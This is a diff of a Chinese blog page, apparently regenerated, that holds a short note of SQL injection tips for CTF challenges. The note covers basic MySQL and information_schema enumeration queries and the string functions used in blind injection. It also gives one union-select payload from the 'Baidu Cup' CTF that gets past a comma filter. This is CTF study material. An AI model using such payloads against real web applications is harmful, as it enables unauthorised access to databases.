@@ -5,7 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="sql注入的一些tip, 书鱼">
-    <meta name="description" content="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧tips:基础语句123456789101112131415161718192021222324252627show databases;         //查看数据库use xxx;">
+    <meta name="description" content="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧tips:基础语句show databases;         //查看数据库
+
+use xxx;                //使用某个数据库
+
+show tables;    ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -387,7 +391,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    248
+                    247
                 </div>
                 
 
@@ -410,9 +414,35 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"><a href="#sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧" class="headerlink" title="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"></a>sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧</h3><h4 id="tips-基础语句"><a href="#tips-基础语句" class="headerlink" title="tips:基础语句"></a>tips:基础语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">show databases;         //查看数据库</span><br><span class="line"></span><br><span class="line">use xxx;                //使用某个数据库</span><br><span class="line"></span><br><span class="line">show tables;            //查看该数据库的数据表</span><br><span class="line"></span><br><span class="line">desc xxx;               //查看该数据表的结构</span><br><span class="line"></span><br><span class="line">select * from xxx;      //查找某个数据表的所有内容</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;        //猜数据库</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&apos;xxxxx&apos;;                                //猜某数据库的数据表</span><br><span class="line"></span><br><span class="line">Select column_name from information_schema.columns where table_name=&apos;xxxxx&apos;;                                //猜某表的所有列</span><br><span class="line"></span><br><span class="line">left(a,b)       //从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">mid(column_name,start[,length])     //从位置start开始，截取column_name字符串的length位，与substr作用相同</span><br><span class="line"></span><br><span class="line">substr(string, start, length)       //从位置start开始，截取字符串string的length长度，与mid作用相同</span><br><span class="line"></span><br><span class="line">ascii()         //将某个字符转换成ascii码</span><br><span class="line"></span><br><span class="line">ord()           //将某个字符转换成ascii码，同ascii()</span><br><span class="line"></span><br><span class="line">select database() //当前数据库</span><br></pre></td></tr></table></figure>
+                <h3 id="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"><a href="#sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧" class="headerlink" title="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"></a>sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧</h3><h4 id="tips-基础语句"><a href="#tips-基础语句" class="headerlink" title="tips:基础语句"></a>tips:基础语句</h4><pre class=" language-mysql"><code class="language-mysql">show databases;         //查看数据库
+
+use xxx;                //使用某个数据库
+
+show tables;            //查看该数据库的数据表
+
+desc xxx;               //查看该数据表的结构
+
+select * from xxx;      //查找某个数据表的所有内容
+
+select schema_name from information_schema.schemata;        //猜数据库
+
+select table_name from information_schema.tables where table_schema='xxxxx';                                //猜某数据库的数据表
+
+Select column_name from information_schema.columns where table_name='xxxxx';                                //猜某表的所有列
+
+left(a,b)       //从左侧截取 a 的前 b 位
+
+mid(column_name,start[,length])     //从位置start开始，截取column_name字符串的length位，与substr作用相同
+
+substr(string, start, length)       //从位置start开始，截取字符串string的length长度，与mid作用相同
+
+ascii()         //将某个字符转换成ascii码
+
+ord()           //将某个字符转换成ascii码，同ascii()
+
+select database() //当前数据库</code></pre>
 <a id="more"></a>
-<h4 id="一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select * from (select database()) a join (select version() ) b %23</span><br></pre></td></tr></table></figure>
+<h4 id="一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h4><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre>
             </div>
             <hr/>
 
@@ -534,7 +564,11 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧tips:基础语句123456789101112131415161718192021222324252627show databases;         //查看数据库use xxx;
+                            sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧tips:基础语句show databases;         //查看数据库
+
+use xxx;                //使用某个数据库
+
+show tables;    
                         
                     </div>
                     <div class="publish-info">
@@ -802,7 +836,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">175.5k</span>&nbsp;字
+                class="white-color">173.5k</span>&nbsp;字
             
             
             
